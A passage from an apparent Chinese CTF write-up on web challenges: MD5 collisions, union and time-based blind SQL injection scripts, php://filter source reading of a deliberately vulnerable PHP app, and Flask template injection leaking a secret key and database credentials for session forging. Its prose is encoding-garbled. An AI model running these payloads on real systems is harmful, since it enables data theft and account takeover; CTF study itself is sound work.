and @$_POST[\u0026#39;code\u0026#39;]) { $username = (string)$_POST[\u0026#39;username\u0026#39;]; $password = (string)$_POST[\u0026#39;password\u0026#39;]; $code = (string)$_POST[\u0026#39;code\u0026#39;]; if (($username == $password ) or ($username == $code) or ($password == $code)) { echo \u0026#34;Your input can\u0026#39;t be the same\u0026#34;; } else if ((md5($username) === md5($password)) and (md5($password) === md5($code))){ echo \u0026#34;Good\u0026#34;; header(\u0026#39;Location: admin.php\u0026#39;); exit(); } else { echo \u0026#34;\u0026lt;pre\u0026gt; Invalid password\u0026lt;/pre\u0026gt;\u0026#34;; } } ?\u0026gt;çœ‹æ¥æ˜¯ md5 å¼ºç¢°æ’ï¼Œè¿™é‡Œç»™ä¸‰ä¸ª md5 ä¸€æ ·çš„å›¾ç‰‡\n$ curl -s http://www.fishtrap.co.uk/black.jpg.coll | md5 b69dd1fd1254868b6e0bb8ed9fe7ecad $ curl -s http://www.fishtrap.co.uk/brown.jpg.coll | md5 b69dd1fd1254868b6e0bb8ed9fe7ecad $ curl -s http://www.fishtrap.co.uk/white.jpg.coll | md5 b69dd1fd1254868b6e0bb8ed9fe7ecad åé¢å°±æ˜¯ç®€å•çš„å‘½ä»¤æ‰§è¡Œäº†\nsqli-1  sql æ³¨å…¥ å‚æ•°æ˜¯ id\nhttp://118.89.111.179:3000/\n æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œå°±æ˜¯å¤„ç†éªŒè¯ç  code æœ‰ç‚¹éº»çƒ¦\nè´´ä¸€ä¸‹è‡ªå·±çš„è„šæœ¬\nimport hashlib import requests from urllib import parse import re def md5(s): return hashlib.md5(s).hexdigest() def cal(code): for i in range(1, 9999999): if md5(str(i).encode(\u0026#39;utf-8\u0026#39;)).startswith(code): return i headers = { \u0026#39;Cookie\u0026#39;: \u0026#39;PHPSESSID=5vsgpoc8m9j8c66d9vfmru0uqd; path=/\u0026#39; } # req = requests.session() url = \u0026#34;http://118.89.111.179:3000/\u0026#34; rep = requests.get(url,headers=headers) match = re.search(r\u0026#39;=== .*\u0026lt;br\u0026gt;\u0026#39;,rep.text) code = match.group().replace(\u0026#34;=== \u0026#34;,\u0026#34;\u0026#34;) code = code.replace(\u0026#34;\u0026lt;br\u0026gt;\u0026#34;,\u0026#34;\u0026#34;) payload = \u0026#39;1 union select table_name from information_schema.tables where table_schema=\\\u0026#39;hgame\\\u0026#39;;#\u0026#39; payload = \u0026#39;1 union Select column_name from information_schema.columns where table_name=\\\u0026#39;f1l1l1l1g\\\u0026#39;;#\u0026#39; payload = \u0026#39;1 union Select f14444444g from f1l1l1l1g;#\u0026#39; url = \u0026#34;http://118.89.111.179:3000/?id=%s\u0026amp;code=%s\u0026#34; % (parse.quote(payload),cal(code)) rep = requests.get(url,headers=headers) print(rep.text) sqli-2  sql æ³¨å…¥\nhttp://118.89.111.179:3001/?id=1\n æˆ‘åšçš„æ—¶å€™\u0026hellip;ä¹Ÿæ˜¯è®¿é—®ä¸äº†\u0026hellip;\ncould not connect to the database: Connection refused I\u0026#39;ll tell you if SQL can be executed. ç›´æ¥æ˜¾ç¤ºé“¾æ¥æ•°æ®åº“å¤±è´¥ï¼Œçœ‹å…¶ä»–å¸ˆå‚…çš„ wp ï¼Œçœ‹æ ·å­æ˜¯ä¸ªç›²æ³¨çš„é¢˜ï¼Œç„¶è€Œ\u0026hellip;\nåŸºç¡€æ¸—é€  ç»¼åˆåˆ©ç”¨å„ç§æ¼æ´æ¥ getshell,ç„¶åæ‰¾åˆ°è¢«è—èµ·æ¥çš„ flagã€‚\n ç”¨http://111.231.140.29:10080/index.php?action=php://filter/read=convert.base64-encode/resource=userç›´æ¥è¯»æºç \nUser.php:\n\u0026lt;?php require_once('functions.php'); if (!isset($_SESSION['login'])) { Header(\u0026quot;Location: /login.php\u0026quot;); exit(); } else { echo \u0026quot;\u0026lt;div id='user-info' class='am-container'\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;div class='am-form'\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;div class='am-form-group am-form-file' id='form-file'\u0026gt;\u0026quot;; $image = get_avatar($_SESSION['user_id']); if ($image != null) { echo \u0026quot;\u0026lt;img type='button' src=data:image/png;base64,\u0026quot; . $image['content'] . \u0026quot; class='am-circle' id='avatar'\u0026gt;\u0026quot;; } else { echo \u0026quot;\u0026lt;div class='am-circle avatar-tmp' id='avatar'\u0026gt;\u0026quot; . md5($_SESSION['user']) . \u0026quot;\u0026lt;/div\u0026gt;\u0026quot;; } } ?\u0026gt; \u0026lt;input type=\u0026quot;file\u0026quot; id=\u0026quot;upfile\u0026quot; onchange=\u0026quot;SelectImage()\u0026quot;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button id=\u0026quot;upload\u0026quot; class=\u0026quot;am-btn am-btn-primary am-disabled\u0026quot;\u0026gt;ä¿ å­˜ å¤´ åƒ\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php echo \u0026quot;\u0026lt;div class='user'\u0026gt;\u0026lt;strong\u0026gt;ç”¨æˆ·åï¼š \u0026lt;/strong\u0026gt; \u0026quot; . $_SESSION['user'] . \u0026quot;\u0026lt;/div\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;hr\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;div class='am-form am-form-horizontal'\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;strong\u0026gt;åŸå¯†ç ï¼š\u0026lt;/strong\u0026gt; \u0026lt;input id='oldpassword' type='password'\u0026gt; \u0026quot;; echo \u0026quot;\u0026lt;br\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;strong\u0026gt;æ–°å¯†ç ï¼š\u0026lt;/strong\u0026gt; \u0026lt;input id='newpassword' type='password'\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;br\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;strong\u0026gt;æ–°å¯†ç ç¡®è®¤ï¼š\u0026lt;/strong\u0026gt; \u0026lt;input id='newpassword_again' type='password'\u0026gt; \u0026quot;; echo \u0026quot;\u0026lt;br\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;/div\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;button onclick='NewPassword()' class='am-btn am-btn-danger'\u0026gt;ç¡® è®¤ ä¿® æ”¹\u0026lt;/button\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;/div\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;/div\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;/div\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;script src='/js/user.js'\u0026gt;\u0026lt;/script\u0026gt;\u0026quot;; ?\u0026gt; Functions.php\n\u0026lt;?php //ini_set(\u0026#34;display_errors\u0026#34;, \u0026#34;on\u0026#34;); require_once(\u0026#39;config.php\u0026#39;); session_start(); function sql_query($sql_query) { global $mysqli; $res = $mysqli-\u0026gt;query($sql_query); return $res; } function csrf_token() { $token = \u0026#39;\u0026#39;; $chars = str_split(\u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39;); for ($i = 0; $i \u0026lt; 48; $i++) { $token = $token . $chars[random_int(0, 61)]; } $_SESSION[\u0026#39;token\u0026#39;] = $token; echo \u0026#34;\u0026lt;input type=\u0026#39;hidden\u0026#39; value=\u0026#39;$token\u0026#39; id=\u0026#39;token\u0026#39;\u0026gt;\u0026#34;; } function res_to_json($res, $type) { $json[\u0026#39;type\u0026#39;] = $type; $json[\u0026#39;status\u0026#39;] = \u0026#34;true\u0026#34;; $json[\u0026#34;content\u0026#34;] = array(); foreach ($res as $message) { $array_tmp[\u0026#39;user_id\u0026#39;] = $message[\u0026#39;user_id\u0026#39;]; $array_tmp[\u0026#39;user\u0026#39;] = $message[\u0026#39;user\u0026#39;]; $array_tmp[\u0026#39;avatar\u0026#39;] = get_avatar($message[\u0026#39;user_id\u0026#39;]) != null ? get_avatar($message[\u0026#39;user_id\u0026#39;])[\u0026#39;content\u0026#39;] : md5($message[\u0026#39;user\u0026#39;]); $array_tmp[\u0026#39;message\u0026#39;] = $message[\u0026#39;content\u0026#39;]; $array_tmp[\u0026#39;message_id\u0026#39;] = $message[\u0026#39;message_id\u0026#39;]; $array_tmp[\u0026#39;time\u0026#39;] = $message[\u0026#39;date\u0026#39;]; array_push($json[\u0026#34;content\u0026#34;], $array_tmp); } $json[\u0026#34;content\u0026#34;] = $json[\u0026#34;content\u0026#34;]; return json_encode($json); } function judge($username, $password) { if ($username == null) { echo \u0026#34;username\u0026#39;s length error!\u0026#34;; return false; } elseif (strlen($password) \u0026lt; 6 or strlen($password) \u0026gt; 16) { echo \u0026#34;password\u0026#39;s length error!\u0026#34;; return false; } else { return true; } } function register($username, $password, $token) { if (judge($username, $password) == 1 and $token === $_SESSION[\u0026#39;token\u0026#39;]) { $password = md5($password); $sql_query = \u0026#34;insert into `users`(`username`,`password`) VALUES (\u0026#39;$username\u0026#39;,\u0026#39;$password\u0026#39;)\u0026#34;; $res = sql_query($sql_query); if ($res) { echo \u0026#39;register success!\u0026#39;; } else { echo \u0026#39;error!\u0026#39;; } } else { echo \u0026#34;error!\u0026#34;; return false; } } function login($username, $password, $token) { if (!isset($_SESSION[\u0026#39;login\u0026#39;]) and $token === $_SESSION[\u0026#39;token\u0026#39;]) { $password = md5($password); $sql_query = \u0026#34;select * from `users` where `username`=\u0026#39;$username\u0026#39; and `password`=\u0026#39;$password\u0026#39;\u0026#34;; $res = sql_query($sql_query); if ($res-\u0026gt;num_rows) { $data = $res-\u0026gt;fetch_array(); $_SESSION[\u0026#39;user_id\u0026#39;] = $data[\u0026#39;user_id\u0026#39;]; $_SESSION[\u0026#39;user\u0026#39;] = $data[\u0026#39;username\u0026#39;]; $_SESSION[\u0026#39;groups\u0026#39;] = $data[\u0026#39;groups\u0026#39;]; $_SESSION[\u0026#39;login\u0026#39;] = 1; setcookie(\u0026#39;user\u0026#39;, $_SESSION[\u0026#39;user\u0026#39;]); setcookie(\u0026#39;groups\u0026#39;, $_SESSION[\u0026#39;groups\u0026#39;]); } else { echo \u0026#34;error!\u0026#34;; return false; } } else { echo \u0026#34;error!\u0026#34;; return false; } } function loginout() { if ($_GET[\u0026#39;loginout\u0026#39;] === $_SESSION[\u0026#39;token\u0026#39;]) { session_destroy(); setcookie(\u0026#39;groups\u0026#39;, null); setcookie(\u0026#39;user\u0026#39;, null); Header(\u0026#34;Location: index.php\u0026#34;); } } function get_avatar($user_id) { $sql_query = \u0026#34;select `avatar` from `users` where `user_id`=$user_id\u0026#34;; $res = sql_query($sql_query)-\u0026gt;fetch_row()[0]; if ($res) { return array(\u0026#39;name\u0026#39; =\u0026gt; $res, \u0026#39;content\u0026#39; =\u0026gt; base64_encode(file_get_contents(\u0026#39;./img/avatar/\u0026#39; . $res . \u0026#39;.png\u0026#39;))); } else { return null; } } function get_new_messages() { $start = $_GET[\u0026#39;start\u0026#39;] ?? 0; $start = addslashes($start); $user_id = $_SESSION[\u0026#39;user_id\u0026#39;]; $sql_query = \u0026#34;select * from `messages` where `user_id`=$user_idLIMIT $start,999999999999\u0026#34;; $res = sql_query($sql_query); if ($res-\u0026gt;num_rows) { return res_to_json($res, \u0026#34;messages\u0026#34;); } } function get_messages() { $start = $_GET[\u0026#39;start\u0026#39;] ?? 0; $start = addslashes($start); $user_id = $_SESSION[\u0026#39;user_id\u0026#39;]; $sql_query = \u0026#34;select * from `messages` where `user_id`=$user_idORDER BY `message_id` DESC LIMIT $start,12\u0026#34;; $res = sql_query($sql_query); if ($res-\u0026gt;num_rows) { return res_to_json($res, \u0026#34;messages\u0026#34;); } } function add_message($message) { if ($_POST[\u0026#39;token\u0026#39;] === $_SESSION[\u0026#39;token\u0026#39;]) { if (isset($_SESSION[\u0026#39;login\u0026#39;]) and mb_strlen($message) \u0026gt; 6) { $user_id = $_SESSION[\u0026#39;user_id\u0026#39;]; $user = $_SESSION[\u0026#39;user\u0026#39;]; $sql_query = \u0026#34;insert into `messages`(`user_id`,`user`,`content`) VALUES($user_id,\u0026#39;$user\u0026#39;,\u0026#39;$message\u0026#39;)\u0026#34;; sql_query($sql_query); } elseif (!isset($_SESSION[\u0026#39;login\u0026#39;])) { echo \u0026#34;login error\u0026#34;; } else { echo \u0026#34;length error\u0026#34;; } } } function delete_message($message_id) { $user_id = $_SESSION[\u0026#39;user_id\u0026#39;]; if ($_POST[\u0026#39;token\u0026#39;] === $_SESSION[\u0026#39;token\u0026#39;]) { if ($_SESSION[\u0026#39;groups\u0026#39;] == 0) { $sql_query = \u0026#34;delete from `messages` where `message_id`=$message_idand `user_id`=$user_id\u0026#34;; } elseif ($_SESSION[\u0026#39;groups\u0026#39;] == 1) { $sql_query = \u0026#34;delete from `messages` where `message_id`=$message_id\u0026#34;; } sql_query($sql_query); } } function rand_filename() { $tmp = `cat /dev/urandom | head -n 10 | md5sum | head -c 15`; $sql_query = \u0026#34;select `avatar` from `users` where `avatar`=$tmp\u0026#34;; $res = sql_query($sql_query); if ($res-\u0026gt;num_rows) { return rand_filename(); } else { return $tmp; } } function upload_avatar() { $type = $_FILES[\u0026#39;file\u0026#39;][\u0026#39;type\u0026#39;]; $user_id = $_SESSION[\u0026#39;user_id\u0026#39;]; if ($type == \u0026#39;image/gif\u0026#39; || $type == \u0026#39;image/jpeg\u0026#39; || $type == \u0026#39;image/png\u0026#39;) { $avatar = get_avatar($user_id); if ($avatar == null) { $name = rand_filename(); move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], \u0026#34;./img/avatar/\u0026#34; . $name . \u0026#34;.png\u0026#34;); $sql_query = \u0026#34;update `users` set `avatar`=\u0026#39;$name\u0026#39; WHERE `user_id`=$user_id\u0026#34;; sql_query($sql_query); } else { move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], \u0026#34;./img/avatar/\u0026#34; . $avatar[\u0026#39;name\u0026#39;] . \u0026#34;.png\u0026#34;); } } } function change_password($opassword, $npassword, $npasswod_again) { if (judge($_SESSION[\u0026#39;user\u0026#39;], $npassword)) { if ($npasswod_again !== $npassword) { echo \u0026#34;difference error\u0026#34;; } else { $user_id = $_SESSION[\u0026#39;user_id\u0026#39;]; $sql_query = \u0026#34;select `password` from `users` where `user_id`=$user_id\u0026#34;; $res = sql_query($sql_query); if ($res-\u0026gt;num_rows) { if ($res-\u0026gt;fetch_row()[0] === md5($opassword)) { $sql_query = \u0026#34;update `users` set `password`=md5($npassword) WHERE `user_id`=$user_id\u0026#34;; $res = sql_query($sql_query); echo $res; echo \u0026#34;successful\u0026#34;; } else { echo \u0026#34;oldpassword error\u0026#34;; } } } } } Message.php\n\u0026lt;h1 class=\u0026quot;title\u0026quot; id=\u0026quot;title\u0026quot;\u0026gt;Message Board\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026quot;container\u0026quot; class=\u0026quot;am-container\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div id=\u0026quot;rocket\u0026quot; class=\u0026quot;am-icon-btn\u0026quot; onclick=\u0026quot;ReturnTop()\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div id=\u0026quot;write_message\u0026quot; class=\u0026quot;am-icon-btn\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;am-modal am-modal-prompt\u0026quot; tabindex=\u0026quot;-1\u0026quot; id=\u0026quot;my-prompt\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;am-modal-dialog am-form\u0026quot; id=\u0026quot;message_area\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;am-modal-hd\u0026quot;\u0026gt;å†™ç•™è¨€\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;am-modal-bd\u0026quot;\u0026gt; \u0026lt;textarea class='textarea' name=\u0026quot;new_message\u0026quot; id=\u0026quot;new_message\u0026quot; cols=\u0026quot;30\u0026quot; rows=\u0026quot;10\u0026quot;\u0026gt;\u0026lt;/textarea\u0026gt;\u0026lt;br\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;am-modal-footer\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;am-btn am-btn-danger button \u0026quot; id=\u0026quot;button_cancel\u0026quot; data-am-modal-cancel\u0026gt;å– æ¶ˆ \u0026lt;/button\u0026gt; \u0026lt;button class=\u0026quot;am-btn am-btn-primary button \u0026quot; id=\u0026quot;button_sumbit\u0026quot; data-am-modal-confirm\u0026gt; æ äº¤ ç•™ è¨€ \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src='/js/index.js'\u0026gt;\u0026lt;/script\u0026gt; Config.php\n\u0026lt;?php $DBHOST = \u0026#34;127.0.0.1\u0026#34;; $DBUSER = getenv(\u0026#39;DATABASE_USER\u0026#39;); $DBPASS = getenv(\u0026#39;DATABASE_PASS\u0026#39;); $DBNAME = \u0026#34;lyb\u0026#34;; $mysqli = new mysqli($DBHOST, $DBUSER, $DBPASS, $DBNAME); ?\u0026gt;Login.php\n\u0026lt;?php require_once(\u0026#39;functions.php\u0026#39;); if (!isset($_POST[\u0026#39;username\u0026#39;]) or !isset($_POST[\u0026#39;password\u0026#39;])) { if (isset($_GET[\u0026#39;loginout\u0026#39;])) { loginout(); } if (!isset($_SESSION[\u0026#39;login\u0026#39;])) { include(\u0026#39;template/login.html\u0026#39;); csrf_token(); } else { Header(\u0026#39;Location: /index.php\u0026#39;); } } else { login(addslashes($_POST[\u0026#39;username\u0026#39;]), addslashes($_POST[\u0026#39;password\u0026#39;]), $_POST[\u0026#39;token\u0026#39;]); } index.php\n\u0026lt;?php include_once(\u0026#34;template/header.php\u0026#34;); if (is_null($_SESSION[\u0026#39;user_id\u0026#39;])) { header(\u0026#39;Location:/login.php\u0026#39;); exit(); } $page = array_key_exists(\u0026#39;action\u0026#39;, $_GET) ? $_GET[\u0026#39;action\u0026#39;] : \u0026#39;message\u0026#39;; require $page .\u0026#39;.php\u0026#39;; include_once(\u0026#34;template/footer.php\u0026#34;); ?\u0026gt;Message_api.php\n\u0026lt;?php require_once(\u0026#39;functions.php\u0026#39;); if ($_GET[\u0026#39;action\u0026#39;] === \u0026#39;add\u0026#39;) { if (!isset($_POST[\u0026#39;new_message\u0026#39;]) or !isset($_POST[\u0026#39;token\u0026#39;])) { header(\u0026#34;Location: /index.php\u0026#34;); } else { add_message(htmlspecialchars(addslashes($_POST[\u0026#39;new_message\u0026#39;]))); } } elseif ($_GET[\u0026#39;action\u0026#39;] === \u0026#39;delete\u0026#39;) { if (!isset($_POST[\u0026#39;message_id\u0026#39;]) or !isset($_POST[\u0026#39;token\u0026#39;])) { header(\u0026#34;Location: /index.php\u0026#34;); } else { delete_message(addslashes($_POST[\u0026#39;message_id\u0026#39;])); } } elseif ($_GET[\u0026#39;action\u0026#39;] === \u0026#39;get_new\u0026#39;) { if (is_null($_SESSION[\u0026#39;user_id\u0026#39;])) { http_response_code(403); } else { echo get_new_messages(); } } elseif ($_GET[\u0026#39;action\u0026#39;] === \u0026#39;get\u0026#39;) { if (is_null($_SESSION[\u0026#39;user_id\u0026#39;])) { http_response_code(403); } else { echo get_messages(); } } åœ¨functions.phpä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ªæ˜æ˜¾çš„æ³¨å…¥\nfunction delete_message($message_id) { $user_id = $_SESSION[\u0026#39;user_id\u0026#39;]; if ($_POST[\u0026#39;token\u0026#39;] === $_SESSION[\u0026#39;token\u0026#39;]) { if ($_SESSION[\u0026#39;groups\u0026#39;] == 0) { $sql_query = \u0026#34;delete from `messages` where `message_id`=$message_idand `user_id`=$user_id\u0026#34;; } elseif ($_SESSION[\u0026#39;groups\u0026#39;] == 1) { $sql_query = \u0026#34;delete from `messages` where `message_id`=$message_id\u0026#34;; } sql_query($sql_query); } } æˆ‘ä»¬å°±å¯ä»¥ä»$message_idè¿›è¡Œæ³¨å…¥ã€‚ç„¶è€Œè¿™ä¸ªæ³¨å…¥å¯ä»¥æ­é…ä»€ä¹ˆè¿›è¡Œæ”»å‡»å‘¢ï¼Œæ—¢ç„¶é¦–é¡µæœ‰æ–‡ä»¶åŒ…å«ï¼Œæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥åˆ©ç”¨ä¸Šä¼ å¤´åƒæ¥è¿›è¡ŒåŒ…å«åˆ©ç”¨ï¼Œè¿™ä¸ªsqlæ³¨å…¥å°±å¯ä»¥å¸®åŠ©æˆ‘ä»¬è·å¾—å¤´åƒæ–‡ä»¶åäº†ã€‚\nå¤§è‡´æ€è·¯å°±å‡ºæ¥äº†ï¼Œé€šè¿‡å¤´åƒä¸Šä¼ ï¼Œç„¶åä½¿ç”¨æ³¨å…¥è·å¾—è·¯å¾„ï¼Œåœ¨ç”¨phar://xxxx/xxxxæ¥è®¿é—®æ‹¿åˆ°shell\nè¿™é‡Œä¸çŸ¥é“ä¸ºä»€ä¹ˆè®¿é—®æœ‰ç‚¹é—®é¢˜ï¼Œè´´ä¸€ä¸‹ä¸€å¶é£˜é›¶å¸ˆå‚…çš„ jio æœ¬å¥½äº†ï¼š\nimport requests import re flag=\u0026#39;\u0026#39; res = \u0026#34;\u0026lt;input type=\u0026#39;hidden\u0026#39; value=\u0026#39;(.*?)\u0026#39; id=\u0026#39;token\u0026#39;\u0026#34; url = \u0026#39;http://111.231.140.29:10080/index.php\u0026#39; header={ \u0026#39;User-Agent\u0026#39;:\u0026#39;curl/7.54.0\u0026#39;, \u0026#39;Accept\u0026#39;:\u0026#39;*/*\u0026#39; } cookie = { \u0026#39;PHPSESSID\u0026#39;:\u0026#39;mobe47sd6q6ocl6g9upcok0ad8\u0026#39;, \u0026#39;user\u0026#39;:\u0026#39;zeddy\u0026#39;, \u0026#39;groups\u0026#39;:\u0026#39;0\u0026#39; } url2 = \u0026#39;http://111.231.140.29:10080/messages_api.php?action=delete\u0026#39; url4 = \u0026#39;http://111.231.140.29:10080/messages_api.php?action=add\u0026#39; for i in range(1,1000): print(i) # for j in range(33,127): for j in \u0026#39;0123456789abcdef\u0026#39;: j = ord(j) r = requests.get(url=url, cookies=cookie,headers=header) token = re.findall(res, r.content.decode(\u0026#39;utf-8\u0026#39;))[0] #payload = \u0026#34;-1 or if((ascii(substr((database()),%d,1))=%d),sleep(5),0)#\u0026#34;%(i,j) payload = \u0026#34;-1 or if((ascii(substr((select avatar from users where username like 0x7a65646479),%d,1))=%d),sleep(3),0)#\u0026#34;%(i,j) data = { \u0026#39;message_id\u0026#39;:payload, \u0026#39;token\u0026#39;:token } try: r = requests.post(data=data,cookies=cookie,url=url2,timeout=2.5,headers=header) except: flag += chr(j) print(flag) r = requests.get(url=url, cookies=cookie,headers=header) token = re.findall(res, r.content.decode(\u0026#39;utf-8\u0026#39;))[0] data = { \u0026#39;new_message\u0026#39;: \u0026#39;123456\u0026#39;, \u0026#39;token\u0026#39;: token } r = requests.post(data=data,cookies=cookie,url=url4,headers=header) break BabyXSS  save æŒ‰é’®å°è¯• xss(å°è¯•è¿‡ç¨‹ä¸éœ€è¦è¾“éªŒè¯ç )ï¼ŒæˆåŠŸåå¸¦ä¸ŠéªŒè¯ç  codeï¼Œsubmit æŒ‰é’®æäº¤ xss è¯­å¥ï¼›flag åœ¨ admin çš„ cookie é‡Œé¢,æ ¼å¼ hgame{xxxxx}ã€‚\nhttp://118.25.18.223:9000/index.php\n ä¸€ç›´è®¿é—®ä¸äº† 233\nå‚è€ƒå…¶ä»–å¸ˆå‚…çš„ wp ï¼Œåªæ˜¯ä¸€ä¸ªç®€å•çš„åŒå†™å…³é”®å­—ç»•è¿‡\nWeek 4 Web happyPython  flag åœ¨ç®¡ç†å‘˜è´¦å·ä¸‹\nhttp://118.25.18.223:3001\n æ€è·¯ä¸»è¦æ˜¯ä¼ªé€  admin cookiel äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¯»secret_key\nä½¿ç”¨ {% raw %} /{{[].class.base.subclasses()}} ä¸ /{{[].class.base.subclasses}} {% endraw %} ä¸¤ä¸ªè¿”å›å‡ç›¸åŒ\n \nå‘ç°æ˜¯()è¢«è¿‡æ»¤äº†\n \nä¸€ç›´æƒ³ç€å»ç”¨æ–‡ä»¶è¯»å–secret_keyï¼Œä½†æ˜¯åˆå› ä¸º()è¢«è¿‡æ»¤ï¼Œæ€ä¹ˆä¹Ÿåšä¸å‡ºæ¥\nåæ¥å‘ç°ç”¨/{{config}}å¯ä»¥å¾—åˆ°â€¦â€¦.orzï¼Œä¹Ÿå¯ä»¥ç”¨url_for.__globals__['current_app'].configè¯»å–\n\u0026lt;Config {\u0026#39;ENV\u0026#39;: \u0026#39;production\u0026#39;, \u0026#39;DEBUG\u0026#39;: False, \u0026#39;TESTING\u0026#39;: False, \u0026#39;PROPAGATE_EXCEPTIONS\u0026#39;: None, \u0026#39;PRESERVE_CONTEXT_ON_EXCEPTION\u0026#39;: None, \u0026#39;SECRET_KEY\u0026#39;: \u0026#39;9RxdzNwq7!nOoK3*\u0026#39;, \u0026#39;PERMANENT_SESSION_LIFETIME\u0026#39;: datetime.timedelta(31), \u0026#39;USE_X_SENDFILE\u0026#39;: False, \u0026#39;SERVER_NAME\u0026#39;: None, \u0026#39;APPLICATION_ROOT\u0026#39;: \u0026#39;/\u0026#39;, \u0026#39;SESSION_COOKIE_NAME\u0026#39;: \u0026#39;session\u0026#39;, \u0026#39;SESSION_COOKIE_DOMAIN\u0026#39;: False, \u0026#39;SESSION_COOKIE_PATH\u0026#39;: None, \u0026#39;SESSION_COOKIE_HTTPONLY\u0026#39;: True, \u0026#39;SESSION_COOKIE_SECURE\u0026#39;: False, \u0026#39;SESSION_COOKIE_SAMESITE\u0026#39;: None, \u0026#39;SESSION_REFRESH_EACH_REQUEST\u0026#39;: True, \u0026#39;MAX_CONTENT_LENGTH\u0026#39;: None, \u0026#39;SEND_FILE_MAX_AGE_DEFAULT\u0026#39;: datetime.timedelta(0, 43200), \u0026#39;TRAP_BAD_REQUEST_ERRORS\u0026#39;: None, \u0026#39;TRAP_HTTP_EXCEPTIONS\u0026#39;: False, \u0026#39;EXPLAIN_TEMPLATE_LOADING\u0026#39;: False, \u0026#39;PREFERRED_URL_SCHEME\u0026#39;: \u0026#39;http\u0026#39;, \u0026#39;JSON_AS_ASCII\u0026#39;: True, \u0026#39;JSON_SORT_KEYS\u0026#39;: True, \u0026#39;JSONIFY_PRETTYPRINT_REGULAR\u0026#39;: False, \u0026#39;JSONIFY_MIMETYPE\u0026#39;: \u0026#39;application/json\u0026#39;, \u0026#39;TEMPLATES_AUTO_RELOAD\u0026#39;: None, \u0026#39;MAX_COOKIE_SIZE\u0026#39;: 4093, \u0026#39;CSRF_ENABLED\u0026#39;: True, \u0026#39;SQLALCHEMY_DATABASE_URI\u0026#39;: \u0026#39;mysql+pymysql://hgame:asdkjhiou12312451r2@127.0.0.1:3306/hgame\u0026#39;, \u0026#39;SQLALCHEMY_TRACK_MODIFICATIONS\u0026#39;: True, \u0026#39;WTF_CSRF_ENABLED\u0026#39;: True, \u0026#39;WTF_CSRF_CHECK_DEFAULT\u0026#39;: True, \u0026#39;WTF_CSRF_METHODS\u0026#39;: {\u0026#39;PUT\u0026#39;, \u0026#39;DELETE\u0026#39;, \u0026#39;POST\u0026#39;, \u0026#39;PATCH\u0026#39;}, \u0026#39;WTF_CSRF_FIELD_NAME\u0026#39;: \u0026#39;csrf_token\u0026#39;, \u0026#39;WTF_CSRF_HEADERS\u0026#39;: [\u0026#39;X-CSRFToken\u0026#39;, \u0026#39;X-CSRF-Token\u0026#39;], \u0026#39;WTF_CSRF_TIME_LIMIT\u0026#39;: 3600, \u0026#39;WTF_CSRF_SSL_STRICT\u0026#39;: True, \u0026#39;SQLALCHEMY_BINDS\u0026#39;: None, \u0026#39;SQLALCHEMY_NATIVE_UNICODE\u0026#39;: None, \u0026#39;SQLALCHEMY_ECHO\u0026#39;: False, \u0026#39;SQLALCHEMY_RECORD_QUERIES\u0026#39;: None, \u0026#39;SQLALCHEMY_POOL_SIZE\u0026#39;: None, \u0026#39;SQLALCHEMY_POOL_TIMEOUT\u0026#39;: None, \u0026#39;SQLALCHEMY_POOL_RECYCLE\u0026#39;: None, \u0026#39;SQLALCHEMY_MAX_OVERFLOW\u0026#39;: None, \u0026#39;SQLALCHEMY_COMMIT_ON_TEARDOWN\u0026#39;: False}\u0026gt; å¾—åˆ°'SECRET_KEY': '9RxdzNwq7!nOoK3*'ï¼Œç™»å½•è‡ªå·±æ³¨å†Œçš„è´¦å·ï¼Œè§£ç è‡ªå·±çš„.session\nsession=.eJwljztqQzEQAO-i2sXuSlpJvsxjv8QYEnjPrkLubkGa6QZmfsuRZ1xf5f4633Erx8PLvSTRjFoNNakTA_QchoC0fMlmGgtR8kRhI_TRhNb0QJIkWGukkjB5MC9ts4VONOBuFZJy9LU0vfbhlt1osok2ZIXk8A0pt2LXmcfr5xnfuwfFlIMcQEbSVPW05r1ip6W1br9RA-3be19x_k8QcPn7ABDuP70.XHK0ew.2CT1_Vu5Qp8rMbm8ig80dve2-Zg python2 session_cookie_manager.py decode -c 